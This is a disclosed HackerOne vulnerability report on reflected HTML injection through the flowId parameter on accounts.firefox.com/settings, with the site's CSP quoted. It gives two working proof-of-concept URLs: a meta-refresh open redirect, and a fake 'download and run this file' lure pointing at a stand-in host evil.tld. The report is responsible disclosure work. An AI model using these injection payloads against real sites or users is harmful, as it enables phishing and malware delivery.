# HTML Injection / Reflected Cross-Site Scripting with CSP on https://accounts.firefox.com/settings

## Report Details
- **Report ID**: 1880896
- **URL**: https://hackerone.com/reports/1880896
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-02-21T11:35:06.010Z
- **Disclosed**: 2023-04-04T11:13:58.292Z

## Reporter
- **Username**: celesian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mozilla

## Vulnerability Information
## Summary:
Good morning,

There is a vulnerability on accounts.firefox.com, where the flowId parameter is reflected into the server response without being escaped for HTML. This causes a Cross-Site Scripting attack, which may allow attackers to take over accounts. 
To do that, one would need to bypass the Content-Security-Policy on Firefox's website, which looks like this:
```http
Content-Security-Policy: connect-src 'self' https://api.accounts.firefox.com https://graphql.accounts.firefox.com https://oauth.accounts.firefox.com https://profile.accounts.firefox.com wss://channelserver.services.mozilla.com https://channelserver.services.mozilla.com https://*.sentry.io http://localhost:4318;default-src 'self';form-action 'self' https://accounts.google.com https://appleid.apple.com;font-src 'self' https://accounts-static.cdn.mozilla.net;frame-src 'none';img-src 'self' blob: data: https://secure.gravatar.com https://firefoxusercontent.com https://profile.accounts.firefox.com https://accounts-static.cdn.mozilla.net;media-src blob:;object-src 'none';report-uri /_/csp-violation;script-src 'self' https://accounts-static.cdn.mozilla.net;style-src 'self' https://accounts-static.cdn.mozilla.net;base-uri 'self';frame-ancestors 'self';script-src-attr 'none';upgrade-insecure-requests
```
Bypassing the Content-Security-Policy was not done yet, and I am not sure if its even doable. Therefore I am reporting the vulnerability as is because even without Javascript execution there are some attacks that are still possible script-less. One theoretical attack that could be possible is using the connect-src directive to make requests to the http://localhost:4318 URL and then possibly leak traces or other sensitive data from OpenTelemetry Collector (making Mozilla employees possibly a target for this attack).

## PoCs
1. Open Redirect
https://accounts.firefox.com/settings?deviceId=cc10a15a5ac94bdf8a9a0bc5b2912520&flowBeginTime=1676972087857&flowId=%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%221;%20http://example.com%22%3E&broker=web&context=web&isSampledUser=false&service=none&uniqueUserId=dbf23f86-d3d1-4576-92bc-ebaa4fd14795

2. UI Redressing
https://accounts.firefox.com/settings?deviceId=cc10a15a5ac94bdf8a9a0bc5b2912520&flowBeginTime=1676972087857&flowId=e587d1d6ceb%22%3E%3Ch1%3EYour+machine+needs+to+be+analyzed.+Please+download+and+run+this+file+to+continue%3a+%3Ca+href%3d%22http%3a//evil.tld/a.exe%22%3EClick%20here%20to%20Download%3C/a%3E%3C/h1%3E%3C!--&broker=web&context=web&isSampledUser=false&service=none&uniqueUserId=dbf23f86-d3d1-4576-92bc-ebaa4fd14795

## Impact

An attacker can inject HTML on the page and potentially run attacks involving user interaction, with achieving arbitrary javascript code execution not being possible due to the Content Security Policy installed on the server.

## Attachments
No attachments
